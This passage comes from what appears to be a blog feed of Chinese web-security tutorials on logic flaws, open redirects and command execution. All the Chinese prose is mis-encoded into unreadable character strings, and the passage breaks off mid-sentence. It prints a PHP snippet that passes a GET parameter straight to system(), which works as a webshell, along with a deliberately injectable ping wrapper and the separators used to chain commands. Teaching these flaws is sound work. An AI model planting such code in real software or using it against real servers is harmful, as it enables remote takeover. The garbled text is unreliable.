ã€ä¿®æ”¹ä¸ªäººèµ„æ–™ç­‰åŠŸèƒ½ã€‚2ï¼‰é’ˆå¯¹å…·ä½“çš„åŠŸèƒ½ç¡®å®šä¸šåŠ¡æµç¨‹ï¼Œè¯¦ç»†åˆ’åˆ†å…·ä½“æ­¥éª¤ï¼Œä»¥è´­ç‰©ä¸ºä¾‹ä»‹ç»ï¼Œè´­ç‰©æµç¨‹å¦‚ä¸‹ï¼š</p><blockquote><p>æŒ‘é€‰å•†å“ï¼Œå•†å“å¯å¤šé€‰ï¼›ç«‹åˆ»è´­ä¹°ï¼Œåœ¨â€œç«‹åˆ»è´­ä¹°â€æŒ‰é’®æ—è¾¹å¯ä»¥é€‰æ‹©è´­ä¹°æ•°é‡ã€è´­ä¹°æ ·å¼ç­‰ï¼›æ˜¾ç¤ºè´­ä¹°ä¿¡æ¯ï¼Œåœ¨æ­¤æ­¥éª¤å¯ä»¥ç»™å–å®¶ç•™è¨€ï¼Œå¡«å†™è´­ä¹°æ•°é‡ã€ä½¿ç”¨ä¼˜æƒ åˆ¸ã€åŒ¿åè´­ä¹°ã€æ‰¾äººä»˜æ¬¾ï¼›æäº¤è®¢å•ï¼› ä»˜æ¬¾ã€‚</p></blockquote><p>3ï¼‰æ‹¦æˆª HTTP/HTTPS è¯·æ±‚ï¼Œåˆ†æå…¶å‚æ•°é¡¹çš„å«ä¹‰ï¼›4ï¼‰ä¿®æ”¹å‚æ•°å€¼ï¼Œå°è¯•è§¦å‘ä¸šåŠ¡é€»è¾‘æ¼æ´ï¼›5ï¼‰è¿”å›å‰é¢æ­¥éª¤ï¼Œå¯¹å…¶ä»–åŠŸèƒ½ç»§ç»­æµ‹è¯•ã€‚</p><p>å¯†ç é‡ç½®</p><p><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/blog/BlogPic/Web%E5%AE%89%E5%85%A8/login_vuln/pass_reset.png" /></p><p>æ”¯ä»˜äº¤æ˜“</p><p><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/blog/BlogPic/Web%E5%AE%89%E5%85%A8/login_vuln/order_proc.png" /></p><h1 id="æˆæƒéªŒè¯ç»•è¿‡">æˆæƒéªŒè¯ç»•è¿‡</h1><p>æ£€æµ‹æ‰‹æ®µ</p><ul><li>æˆæƒè®¿é—®</li><li>æœªæˆæƒè®¿é—®</li></ul><h2 id="æœªæˆæƒè®¿é—®">æœªæˆæƒè®¿é—®</h2><p>éæˆæƒè®¿é—®æ˜¯æŒ‡ç”¨æˆ·åœ¨æ²¡æœ‰é€šè¿‡è®¤è¯æˆæƒçš„æƒ…å†µä¸‹èƒ½å¤Ÿç›´æ¥è®¿é—®éœ€è¦é€šè¿‡è®¤è¯æ‰èƒ½è®¿é—®åˆ°çš„é¡µé¢æˆ–æ–‡æœ¬ä¿¡æ¯ã€‚å°è¯•å°†ä¸€äº›æ•æ„Ÿçš„é¡µé¢é“¾æ¥å¤åˆ¶äºå…¶ä»–æµè§ˆå™¨æˆ–å…¶ä»–ç”µè„‘ä¸Šè¿›è¡Œè®¿é—®ï¼Œçœ‹æ˜¯å¦èƒ½è®¿é—®æˆåŠŸã€‚</p><h2 id="è¶Šæƒè®¿é—®">è¶Šæƒè®¿é—®</h2><ol type="1"><li>å‚ç›´è¶Šæƒï¼ˆå‚ç›´è¶Šæƒæ˜¯æŒ‡ä½¿ç”¨æƒé™ä½çš„ç”¨æˆ·å¯ä»¥è®¿é—®æƒé™è¾ƒé«˜çš„ç”¨æˆ·ï¼‰</li><li>æ°´å¹³è¶Šæƒï¼ˆæ°´å¹³è¶Šæƒæ˜¯æŒ‡ç›¸åŒæƒé™çš„ä¸åŒç”¨æˆ·å¯ä»¥äº’ç›¸è®¿é—®ï¼‰</li></ol><h1 id="å¯†ç æ‰¾å›">å¯†ç æ‰¾å›</h1><p>1ï¼‰å¯†ç æ‰¾å›çš„å‡­è¯ï¼ˆéªŒè¯ç ï¼‰å¤ªå¼±ï¼Œå¦‚åªéœ€è¦å¡«å…¥ä¸€ä¸ªå››ä½æˆ–è€…å…­ä½çš„çº¯æ•°å­—å°±å¯ä»¥é‡ç½®å¯†ç ï¼Œå¯¼è‡´å¯ä»¥æš´åŠ›ç ´è§£ã€‚2ï¼‰å¯†ç æ‰¾å›å‡­è¯å¯ä»å®¢æˆ·ç«¯ç›´æ¥è·å–ã€‚3ï¼‰å¯†ç æ‰¾å›å‡­è¯åœ¨é¡µé¢ä¸­å¯ä»¥ç›´æ¥è·å–ã€‚4ï¼‰ç”¨æˆ·æ‰¾å›å¯†ç çš„é‚®ç®±åœ°å€æˆ–è€…æ‰‹æœºå·ç è¢«ä¿®æ”¹ã€‚5ï¼‰åœ¨æœ€åæäº¤ä¿®æ”¹çš„å¯†ç å¤„çš„é€»è¾‘é”™è¯¯ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> websec </category>
          
          <category> logic_vuln </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>URL é‡å®šå‘æ€»ç»“</title>
      <link href="/blog/2019/10/05/websec/url_redirect/"/>
      <url>/blog/2019/10/05/websec/url_redirect/</url>
      
        <content type="html"><![CDATA[<h1 id="url-è·³è½¬åŸç†">URL è·³è½¬åŸç†</h1><ol type="1"><li>åº”ç”¨è¶Šæ¥è¶Šå¤šçš„éœ€è¦ä¸ç¬¬ä¸‰æ–¹åº”ç”¨äº¤äº’</li><li>åœ¨è‡ªèº«åº”ç”¨å†…éƒ¨æ ¹æ®ä¸åŒçš„é€»è¾‘å°†ç”¨æˆ·å¼•å‘ä¸åŒçš„é¡µé¢</li></ol><p>è­¬å¦‚ï¼šä¸€ä¸ªå…¸å‹çš„ç™»å½•æ¥å£å°±ç»å¸¸éœ€è¦åœ¨ç™»å½•æˆåŠŸä¹‹åå°†ç”¨æˆ·å¼•å¯¼åˆ°ç™»é™†ä¹‹å‰çš„é¡µé¢ï¼Œæ•´ä¸ªè¿‡ç¨‹ä¸­å¦‚æœå¤„ç†ä¸å¥½ï¼Œå°±å¯èƒ½å¯¼è‡´ä¸€äº›å®‰å…¨é—®é¢˜ï¼Œç‰¹å®šæ¡ä»¶ä¸‹å¯èƒ½å¼•èµ·ä¸¥é‡çš„å®‰å…¨æ¼æ´ã€‚</p><h1 id="ç±»å‹">ç±»å‹</h1><p>ä¸¤ç§ç±»å‹çš„è·³è½¬å¯¹ç”¨æˆ·æ¥è¯´æ˜¯é€æ˜çš„ï¼Œéƒ½æ˜¯æŒ‡å‘æˆ–è·³è½¬åˆ°å¦ä¸€ä¸ªé¡µé¢ï¼Œé¡µé¢å‘ç”Ÿäº†å˜åŒ–ã€‚</p><h2 id="å®¢æˆ·ç«¯è·³è½¬é‡å®šå‘">å®¢æˆ·ç«¯è·³è½¬ï¼ˆé‡å®šå‘ï¼‰</h2><p>å®¢æˆ·ç«¯æ›¿æ¢ä¹Ÿè¢«ç§°ä¸º URL é‡å®šå‘ï¼Œç”¨æˆ·æµè§ˆå™¨çš„åœ°å€æ  URLä¼šæœ‰æ˜æ˜¾çš„å˜åŒ–ã€‚</p><p>æ¯”å¦‚ï¼šå½“å‰é¡µé¢ä¸º http://www.test.com.xk.php ï¼Œå½“ç‚¹å‡» â€œç™»å½•â€œæŒ‰é’®åä¼šæŒ‡å‘ http:test.com/login/phpé¡µé¢å‘ç”Ÿå˜åŒ–ï¼Œè¿™å°±æ˜¯å®¢æˆ·ç«¯è·³è½¬ã€‚</p><h2 id="æœåŠ¡ç«¯è·³è½¬è¯·æ±‚è½¬å‘">æœåŠ¡ç«¯è·³è½¬ï¼ˆè¯·æ±‚è½¬å‘ï¼‰</h2><p>æœåŠ¡ç«¯ä¹Ÿç§°ä¸º URL è½¬å‘ï¼ŒæœåŠ¡ç«¯è·³è½¬æ—¶ï¼Œç”¨æˆ·æµè§ˆçš„åœ°å€æ ä¸ä¼šå˜åŒ–çš„ã€‚</p><p>æ¯”å¦‚ï¼šå½“å‰é¡µé¢ URL ä¸º http://www.test.com/xk.php, å½“ç‚¹å‡» â€œç™»å½•â€æŒ‰é’®åï¼Œ æµè§ˆå™¨åœ°å€æ çš„ URL æ²¡å˜ã€‚ä½†æ˜¯é¡µé¢ä¼šå‘ç”Ÿå˜åŒ–ã€‚</p><p>è¿˜æœ‰ä¸€äº›è·³è½¬ä¸å±äºè½¬å‘ï¼Œä¹Ÿä¸å±äºé‡å®šå‘ï¼Œè€Œæ˜¯ç›´æ¥å‘æœåŠ¡å™¨å‘é€è¯·æ±‚ï¼Œè¿™å°±æ˜¯ç‚¹å‡»åŠ«æŒäº†ã€‚æ¯”å¦‚ï¼šä¸‹é¢a æ ‡ç­¾</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;http://www.test.com/xk.jsp&quot;&gt;å®‰å…¨æµ‹è¯•&lt;/a&gt;</span><br></pre></td></tr></table></figure><h1 id="æ”»å‡»æ–¹å¼åŠå±å®³">æ”»å‡»æ–¹å¼åŠå±å®³</h1><p>åå°æœåŠ¡å™¨åœ¨å‘ŠçŸ¥æµè§ˆå™¨è·³è½¬æ—¶ï¼Œæœªå¯¹å®¢æˆ·ç«¯ä¼ å…¥çš„é‡å®šå‘åœ°å€è¿›è¡Œåˆæ³•çš„æ ¡éªŒå¯¼è‡´äº†ç”¨æˆ·æµè§ˆå™¨è·³è½¬åˆ°é’“é±¼é¡µé¢çš„ä¸€ç§æ¼æ´ã€‚</p><p>æ¶æ„ç”¨æˆ·å®Œå…¨å¯ä»¥å€Ÿç”¨ URLè·³è½¬æ¥æ¬ºéª—å®‰å…¨æ„è¯†è¾ƒä½çš„ç”¨æˆ·ï¼Œä»è€Œå¯¼è‡´â€œä¸­å¥–â€ä¹‹ç±»çš„æ¬ºè¯ˆï¼Œè¿™å¯¹äºä¸€äº›æœ‰åœ¨çº¿ä¸šåŠ¡çš„ä¼ä¸šå¦‚ï¼šæ·˜å®ï¼Œäºšé©¬é€Šç­‰ï¼Œå±å®³è¾ƒå¤§ã€‚</p><p>åŒæ—¶å€ŸåŠ© URL è·³è½¬ï¼Œä¹Ÿå¯ä»¥çªç ´å¸¸è§çš„åŸºäºâ€œç™½åå•æ–¹å¼â€çš„ä¸€äº›å®‰å…¨é™åˆ¶ï¼Œå¦‚ä¼ ç»Ÿ IM é‡Œå¯¹äº URLçš„ä¼ æ’­ä¼šè¿›è¡Œå®‰å…¨æ ¡éªŒï¼Œä½†æ˜¯å¯¹äºå¤§å…¬å¸çš„åŸŸååŠ URLå°†ç›´æ¥å…è®¸é€šè¿‡å¹¶ä¸”æ˜¾ç¤ºä¸ºå¯ä¿¡çš„ URLï¼Œè€Œä¸€æ—¦ URLé‡ŒåŒ…å«ä¸€äº›è·³è½¬æ¼æ´å°†å¯èƒ½å¯¼è‡´å®‰å…¨é™åˆ¶è¢«ç»•è¿‡ã€‚</p><p>å¦‚æœå…è®¸å¼•ç”¨ä¸€äº›èµ„æºçš„é™åˆ¶æ˜¯ä¾èµ–äº â€œç™½åå•æ–¹å¼â€ï¼ŒåŒæ ·å¯èƒ½è¢«ç»•è¿‡å¯¼è‡´å®‰å…¨é£é™©</p><p>è­¬å¦‚ï¼šå¸¸è§çš„ä¸€äº›åº”ç”¨å…è®¸å¼•å…¥å¯ä¿¡ç«™ç‚¹å¦‚ï¼šbaidu.comçš„è§†é¢‘ï¼Œé™åˆ¶æ–¹å¼å¾€å¾€æ˜¯æ£€æŸ¥ URL æ˜¯å¦æ˜¯ baidu.com æ¥å®ç°ï¼Œå¦‚æœ baidu.comå†…å«ä¸€ä¸ª URLè·³è½¬æ¼æ´ï¼Œå°†å¯¼è‡´æœ€ç»ˆå¼•å…¥çš„èµ„æºå±äºä¸å¯ä¿¡çš„ç¬¬ä¸‰æ–¹èµ„æºæˆ–è€…æ¶æ„ç«™ç‚¹ï¼Œæœ€ç»ˆå¯¼è‡´å®‰å…¨é—®é¢˜ã€‚</p><h1 id="é’“é±¼æ”»å‡»">é’“é±¼æ”»å‡»</h1><p>æ¨¡æ‹Ÿç½‘é¡µæˆ–è€…è½¯ä»¶ï¼Œå‡ ä¹ä¸å®˜æ–¹çš„è½¯ä»¶å®Œå…¨ç›¸åŒï¼Œè¿åŸŸåä¹Ÿéå¸¸ç›¸ä¼¼ã€‚</p><p>é˜²æŠ¤æªæ–½ï¼šæ¯”å¦‚ï¼šé»‘åå•ç­–ç•¥ï¼Œå¯¹ä¸€äº›é“¾æ¥è¿›è¡Œå±é™©æ ‡è¯†</p><p>URLè·³è½¬å¯¹è‡ªèº«æ²¡æœ‰å±å®³ï¼Œä½†æ˜¯è¿™ä¸ªæ¼æ´å¯ä»¥æˆä¸ºé»‘å®¢è¿›è¡Œå…¶ä»–æ¶æ„è¡Œä¸ºçš„åŠ©æ‰‹æˆ–è·³æ¿ã€‚</p><h1 id="ç»•è¿‡-url-é™åˆ¶">ç»•è¿‡ URL é™åˆ¶</h1><p><ahref="https://y-hkl.github.io/2018/01/11/URL%E8%B7%B3%E8%BD%AC%E6%BC%8F%E6%B4%9E/">URLè·³è½¬æ¼æ´</a></p><p>å¸¸è§çš„ï¼šæ­£/åæ–œæ ï¼ŒåŒåæ–œæ ã€‚@ï¼Œ#ï¼Œç™½åå•ç¼ºé™·</p><p>URL æ‰¹é‡ï¼š</p><p>å¸¸è§å…³é”®å­—ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redirectã€goã€returnã€returnToã€redirectã€returnurl</span><br></pre></td></tr></table></figure><p>å¸¸å‡ºç°çš„ä½ç½®ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">login, register, logout ,</span><br><span class="line">changesite language, links in emails</span><br></pre></td></tr></table></figure><h1 id="æ¼æ´ç»„åˆ">æ¼æ´ç»„åˆ</h1><p>URL æ¼æ´ä¸å…¶ä»–æ¼æ´ç»„åˆ</p><p><ahref="https://blkstone.github.io/2017/12/25/bug-hunter-tutorial-zseano/">zseanoæ¼æ´èµé‡‘çŒäººç³»åˆ—æ•™ç¨‹å¼€æ”¾ URL é‡å®šå‘</a></p><p><strong>è·³è½¬çš„åœ°æ–¹å¾ˆå®¹æ˜“æœ‰ XSSï¼Œæ¯”å¦‚ï¼šä½¿ç”¨ window.location.hrefè·³è½¬çš„æ—¶å€™</strong></p>]]></content>
      
      
      <categories>
          
          <category> websec </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>å‘½ä»¤æ‰§è¡Œå…¥é—¨ç¯‡</title>
      <link href="/blog/2019/10/05/websec/cmd_execution/cmd_exec/"/>
      <url>/blog/2019/10/05/websec/cmd_execution/cmd_exec/</url>
      
        <content type="html"><![CDATA[<h1 id="å»ºè®®çš„å­¦ä¹ æ–¹æ³•">å»ºè®®çš„å­¦ä¹ æ–¹æ³•</h1><ol type="1"><li><p>å­¦ä¹ å¹¶çµæ´»æŒæ¡å¸¸è§çš„ç¼–ç¨‹è¯­è¨€ï¼Œå¦‚ PHPã€JAVA ç­‰ã€‚</p></li><li><p>ç†Ÿæ‚‰å¹¶å¯çµæ´»è¿ç”¨å¸¸è§çš„ç¨‹åºæ¡†æ¶ï¼Œå¦‚ Strut 2ã€ThinkPHPç­‰ã€‚</p></li><li><p>æ‰‹å·¥å’Œå·¥å…·ç»“åˆè¿ç”¨ï¼Œå¯å¯¹ç¨‹åºæºä»£ç è¿›è¡Œé’ˆå¯¹æ€§å®¡è®¡ã€‚</p></li></ol><p>å¾ˆå¤šäººå–œæ¬¢æŠŠä»£ç æ‰§è¡Œç§°ä¸ºå‘½ä»¤æ‰§è¡Œæ¼æ´ï¼Œå› ä¸ºå‘½ä»¤æ‰§è¡Œå’Œä»£ç æ‰§è¡Œéƒ½å¯ä»¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚</p><p>åŒºåˆ«ï¼š</p><p>å‘½ä»¤æ‰§è¡Œæ¼æ´ç›´æ¥æ‰§è¡Œæ“ä½œç³»ç»Ÿçš„å‘½ä»¤ï¼›</p><p>ä»£ç æ‰§è¡Œæ¼æ´æ˜¯é è„šæœ¬ä»£ç è°ƒç”¨ç³»ç»Ÿå‘½ä»¤ï¼Œç„¶åæ‰§è¡Œã€‚</p><h1 id="å¸¸è§æ”»å‡»æµç¨‹">å¸¸è§æ”»å‡»æµç¨‹</h1><ol type="1"><li><p>å‰æœŸå‡†å¤‡</p><p>ä¸‹è½½ç¨‹åºæºç ï¼Œå¹¶éƒ¨ç½²æµ‹è¯•ç¯å¢ƒ</p></li><li><p>ä»£ç å®¡è®¡</p><ul><li>ç»“åˆæ‰‹å·¥å’Œå·¥å…·å¯¹ç¨‹åºæºä»£ç è¿›è¡Œç™½ç›’å®¡è®¡</li><li>åˆ©ç”¨å¸¸è§é»‘ç›’æŠ€æœ¯æ‰‹æ®µå¯¹å½“å‰ç¯å¢ƒè¿›è¡Œæ£€æµ‹</li></ul></li><li><p>æ”»å‡»åˆ©ç”¨</p><p>é’ˆå¯¹ç¬¬äºŒé˜¶æ®µå‘ç°çš„é—®é¢˜è¿›è¡Œåˆ†æå’Œåˆ©ç”¨</p></li></ol><h1 id="å®šä¹‰åŠåŸç†">å®šä¹‰åŠåŸç†</h1><h2 id="å®šä¹‰">å®šä¹‰</h2><p>å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼Œå°±æ˜¯æŒ‡ç”¨æˆ·é€šè¿‡æµè§ˆå™¨æˆ–å…¶ä»–è¾…åŠ©ç¨‹åºæäº¤æ‰§è¡Œå‘½ä»¤ï¼Œç”±äºæœåŠ¡å™¨ç«¯æœ‰é’ˆå¯¹æ‰§è¡Œå‡½æ•°åšè¿‡æ»¤ï¼Œå¯¼è‡´åœ¨æ²¡æœ‰æŒ‡å®šç»å¯¹è·¯å¾„çš„æƒ…å†µä¸‹å°±æ‰§è¡Œå‘½ä»¤ã€‚</p><p>é€šä¿—åœ°è®²ï¼šå½“åº”ç”¨éœ€è¦è°ƒç”¨ä¸€äº›å¤–éƒ¨ç¨‹åºå»å¤„ç†å†…å®¹çš„æƒ…å†µä¸‹ï¼Œå°±ä¼šç”¨åˆ°ä¸€äº›æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„å‡½æ•°ã€‚å¦‚php ä¸­çš„ systemã€execã€shell_execç­‰ï¼Œå½“ç”¨æˆ·å¯ä»¥æ§åˆ¶å‘½ä»¤æ‰§è¡Œå‡½æ•°ä¸­çš„å‚æ•°æ—¶ï¼Œå°†å¯ä»¥æ³¨å…¥æ¶æ„ç³»ç»Ÿå‘½ä»¤åˆ°æ­£å¸¸çš„å‘½ä»¤ä¸­ï¼Œé€ æˆå‘½ä»¤æ‰§è¡Œæ”»å‡»ã€‚</p><h2 id="åŸç†">åŸç†</h2><p>å‘½ä»¤æ‰§è¡Œæ¼æ´ä¹‹æ‰€ä»¥ä¼šäº§ç”Ÿï¼ŒåŸå› å°±æ˜¯ç”±äºå¼€å‘äººå‘˜ç¼–å†™æºç ï¼Œæ²¡æœ‰é’ˆå¯¹ä»£ç ä¸­å¯æ‰§è¡Œçš„ç‰¹æ®Šå‡½æ•°å…¥å£åšè¿‡æ»¤ï¼Œå¯¼è‡´å®¢æˆ·ç«¯å¯ä»¥æäº¤æ¶æ„æ„é€ è¯­å¥æäº¤ï¼Œå¹¶äº¤ç”±æœåŠ¡å™¨ç«¯æ‰§è¡Œã€‚å‘½ä»¤æ³¨å…¥æ”»å‡»ä¸­WEB æœåŠ¡å™¨æ²¡æœ‰è¿‡æ»¤ç±»ä¼¼ system()ï¼Œeval()ï¼Œexec()ç­‰å‡½æ•°æ˜¯è¯¥æ¼æ´æ”»å‡»æˆåŠŸçš„æœ€ä¸»è¦åŸå› ã€‚</p><h1 id="å±å®³">å±å®³</h1><ol type="1"><li>ç»§æ‰¿ Web æœåŠ¡ç¨‹åºçš„æƒé™å»æ‰§è¡Œç³»ç»Ÿå‘½ä»¤æˆ–è¯»å†™æ–‡ä»¶</li><li>åå¼¹ Shell</li><li>æ§åˆ¶æ•´ä¸ªç½‘ç«™ç”šè‡³æ§åˆ¶æœåŠ¡å™¨</li><li>è¿›ä¸€æ­¥å†…ç½‘æ¸—é€</li><li>æŒ‚é©¬ã€é’“é±¼ã€æ•æ„Ÿä¿¡æ¯æ³„éœ²</li></ol><h1 id="åˆ†ç±»">åˆ†ç±»</h1><ul><li><p>æ¡†æ¶ç»„ä»¶å±‚ï¼š</p><p>å¾ˆå…¸å‹çš„å°±æ˜¯ WordPress ä¸­ï¼Œå¯ä»¥é€‰æ‹©ä½¿ç”¨ ImageMagickè¿™ä¸ªå¸¸ç”¨çš„å›¾ç‰‡å¤„ç†ç»„ä»¶ï¼Œå¯¹ç”¨æˆ·ä¸Šä¼ çš„å›¾ç‰‡è¿›è¡Œå¤„ç†ï¼Œé€ æˆå‘½ä»¤æ‰§è¡Œï¼›JAVAä¸­çš„å‘½ä»¤æ‰§è¡Œæ¼ï¼ˆstruts2/Elasticsearch ç­‰ï¼‰ï¼›ThinkPHP å‘½ä»¤æ‰§è¡Œ</p></li><li><p>ä»£ç å±‚ï¼šä¸€äº›å•†ä¸šåº”ç”¨éœ€è¦æ‰§è¡Œå‘½ä»¤ï¼Œå•†ä¸šåº”ç”¨çš„ä¸€äº›æ ¸å¿ƒä»£ç å¯èƒ½å°è£…åœ¨äºŒè¿›åˆ¶æ–‡ä»¶ä¸­ï¼Œåœ¨web åº”ç”¨ä¸­é€šè¿‡ systemç­‰å‡½æ•°æ¥è°ƒç”¨ã€‚å½“ç”¨æˆ·å¯ä»¥æ§åˆ¶è¿™äº›å‡½æ•°ä¸­çš„å‚æ•°æ—¶ï¼Œå°±å¯ä»¥å°†æ¶æ„ç³»ç»Ÿå‘½ä»¤æ‹¼æ¥åˆ°æ­£å¸¸å‘½ä»¤ä¸­ï¼Œä»è€Œé€ æˆå‘½ä»¤æ‰§è¡Œæ”»å‡»ï¼Œè¿™å°±æ˜¯å‘½ä»¤æ‰§è¡Œæ¼æ´ã€‚</p></li><li><p>ç³»ç»Ÿå±‚ï¼š</p><p>ï¼ˆbash ç ´å£³æ¼æ´ï¼‰å¦‚æœæˆ‘ä»¬èƒ½å¤Ÿæ§åˆ¶æ‰§è¡Œçš„ bashçš„ç¯å¢ƒå˜é‡ï¼Œå°±å¯ä»¥é€šè¿‡ç ´å£³æ¼æ´æ¥æ‰§è¡Œä»»æ„ä»£ç ï¼›</p></li></ul><p>åˆ©ç”¨æ¡ä»¶</p><ol type="1"><li>åº”ç”¨è°ƒç”¨æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„å‡½æ•°</li><li>å°†ç”¨æˆ·è¾“å…¥ä½œä¸ºç³»ç»Ÿå‘½ä»¤çš„å‚æ•°æ‹¼æ¥åˆ°å‘½ä»¤è¡Œä¸­</li><li>æ²¡æœ‰å¯¹ç”¨æˆ·è¾“å…¥è¿›è¡Œè¿‡æ»¤æˆ–è¿‡æ»¤ä¸ä¸¥</li></ol><h1 id="æ¡†æ¶ç»„ä»¶å±‚">æ¡†æ¶ç»„ä»¶å±‚</h1><p><ahref="http://blog.topsec.com.cn/apache-structs2-s2-032%e6%8a%80%e6%9c%af%e5%88%86%e6%9e%90%e5%8f%8a%e6%bc%8f%e6%b4%9e%e6%a3%80%e6%b5%8b%e8%84%9a%e6%9c%ac/?utm_source=tuicool&amp;utm_medium=referral">ApacheStruts2 s2-032 æŠ€æœ¯åˆ†æåŠæ¼æ´æ£€æµ‹è„šæœ¬</a> è‡ªå·±å»æ­å»ºç¯å¢ƒï¼Œæµ‹è¯•ã€‚</p><h1 id="ä»£ç å±‚">ä»£ç å±‚</h1><p>PHP ä¸‹å‘½ä»¤æ‰§è¡Œå‡½æ•°</p><p>åœ¨ PHP ä¸­å…·æœ‰æ‰§è¡Œç³»ç»Ÿå‘½ä»¤åŠŸèƒ½çš„å‡½æ•°å¦‚ä¸‹:</p><ol type="1"><li>system</li><li>exec</li><li>shell_exec</li><li>passthry</li><li>popen</li><li>proc_popen</li></ol><p>æç¤ºï¼šæŸäº›æƒ…å†µä¸‹ï¼Œè¦æ³¨æ„å­˜åœ¨ä»¥ä¸Šå‡½æ•°çš„ PHP æ–‡ä»¶ï¼Œæœ‰å¯èƒ½æ˜¯Webshell</p><p>å‘½ä»¤æ‰§è¡Œæ¼æ´ä»£ç åˆ†æ</p><p>ä»¥ä¸‹ç»™å‡ºä¸€ä¸ªå­˜åœ¨å‘½ä»¤æ‰§è¡Œæ¼æ´çš„ç®€å•ä»£ç </p><p>å‚è€ƒé“¾æ¥ï¼šphp.net --&gt;system</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo &quot;&lt;pre&gt;&quot;;</span><br><span class="line">if(isset($_GET[&#x27;cmd&#x27;]))</span><br><span class="line">&#123;</span><br><span class="line">system($_GET[&quot;cmd&quot;]);</span><br><span class="line">&#125;</span><br><span class="line">echo &quot;&lt;/pre&gt;&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h2 id="windows-ä¸‹å‘½ä»¤æ‰§è¡Œæ¼æ´æŠ€å·§">Windows ä¸‹å‘½ä»¤æ‰§è¡Œæ¼æ´æŠ€å·§</h2><h3 id="å‘½ä»¤æ‰§è¡Œä»£ç åˆ†æ">å‘½ä»¤æ‰§è¡Œä»£ç åˆ†æ</h3><p>ä»¥ä¸‹ä½¿ç”¨ PHP ä»£ç ï¼Œå¯¹æŒ‡å®šç›®æ ‡æ‰§è¡Œ ping å‘½ä»¤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo &quot;&lt;pre&gt;&quot;;</span><br><span class="line">$arg = $_GET[&quot;cmd&quot;];</span><br><span class="line">if($arg)&#123;</span><br><span class="line">system(&#x27;ping $arg&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">echo &quot;&lt;/pre&gt;&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h3 id="å‘½ä»¤æ‰§è¡Œæ¼æ´åˆ©ç”¨æ€è·¯">å‘½ä»¤æ‰§è¡Œæ¼æ´åˆ©ç”¨æ€è·¯</h3><p>ä»£ç ä¸­æ‹¼æ¥ç”¨æˆ·çš„è¾“å…¥å¹¶é€šè¿‡ systemå‡½æ•°æ‰§è¡Œï¼Œä½†æ˜¯æ— æ³•ç›´æ¥æ‰§è¡Œç”¨æˆ·çš„è‡ªå®šä¹‰å‘½ä»¤ã€‚</p><p>æ€è·¯ï¼š</p><p>æˆªæ–­è¾“å…¥ï¼Œé‡æ–°æ‹¼æ¥ã€‚ä¸¤æ¡å‘½ä»¤éƒ½è¾“å…¥å¹¶æ‰§è¡Œ</p><h3 id="å‘½ä»¤æ‰§è¡Œæ¼æ´æ‹¼æ¥ç¬¦">å‘½ä»¤æ‰§è¡Œæ¼æ´æ‹¼æ¥ç¬¦</h3><p>åœ¨ Windows ç³»ç»Ÿä¸‹çš„ cmd å‘½ä»¤ä¸­ï¼Œæœ‰ä»¥ä¸‹ä¸€äº›é˜¶æ®µæ‹¼æ¥ç¬¦</p><p><code>&amp;</code> ï¼šå‰é¢çš„è¯­å¥ä¸ºå‡ï¼Œåˆ™ç›´æ¥æ‰§è¡Œåé¢çš„ --&gt;</p><p><code>&amp;&amp;</code> ï¼šå‰é¢çš„è¯­å¥ä¸ºå‡ï¼Œåˆ™ç›´æ¥å‡ºé”™ï¼Œåé¢çš„ä¹Ÿä¸æ‰§è¡Œ--&gt; é€»è¾‘ä¸</p><p><code>|</code>ï¼šç›´æ¥æ‰§è¡Œåé¢çš„è¯­å¥ --&gt;ç®¡é“ç¬¦ï¼Œå°†å‰é¢å‘½ä»¤çš„ç»“æœä¼ ç»™åé¢ï¼Œç„¶åæ‰§è¡Œåé¢å‘½ä»¤</p><p><code>||</code>ï¼šå‰é¢å‡ºé”™æ‰§è¡Œåé¢çš„ --&gt; é€»è¾‘æˆ–</p><p>ä½¿ç”¨æ‹¼æ¥ç¬¦ï¼Œä»è€Œåˆ©ç”¨å‘½ä»¤æ‰§è¡Œæ¼æ´æ‰§è¡Œ ipconfig å‘½ä»¤</p><p>è¿™å››ä¸ªå‘½ä»¤æ‹¼æ¥ç¬¦æœ‰å¯èƒ½åœ¨ä¸åŒçš„ Windowså¹³å°ä¸‹ï¼Œæœ‰äº›ä¸ä¸€æ ·ï¼Œæˆ‘ä»¬æµ‹è¯•çš„æ—¶å€™ï¼Œå¯ä»¥å››ç§éƒ½è¯•ä¸€è¯•ï¼Œæ‰¾åˆ°å¯ä»¥åˆ©ç”¨çš„ã€‚</p><h2 id="linux-å‘½ä»¤æ‰§è¡Œæ¼æ´åˆ©ç”¨æŠ€å·§">Linux å‘½ä»¤æ‰§è¡Œæ¼æ´åˆ©ç”¨æŠ€å·§</h2><h3 id="å‘½ä»¤æ‰§è¡Œç¤ºä¾‹ä»£ç åˆ†æ">å‘½ä»¤æ‰§è¡Œç¤ºä¾‹ä»£ç åˆ†æ</h3><p>ä»¥ä¸‹ä½¿ç”¨ PHP ä»£ç 